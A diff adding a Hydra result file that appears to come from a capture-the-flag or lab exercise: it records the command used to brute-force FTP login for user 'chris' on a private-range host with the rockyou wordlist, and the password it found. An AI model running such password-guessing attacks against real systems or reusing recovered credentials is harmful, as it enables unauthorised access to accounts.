@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2024-05-23 17:17:08 on 10.10.148.56 ftp (hydra -l chris -P /usr/share/wordlists/rockyou.txt -o chris__ftp_pass.txt ftp://10.10.148.56)
+[21][ftp] host: 10.10.148.56   login: chris   password: crystal
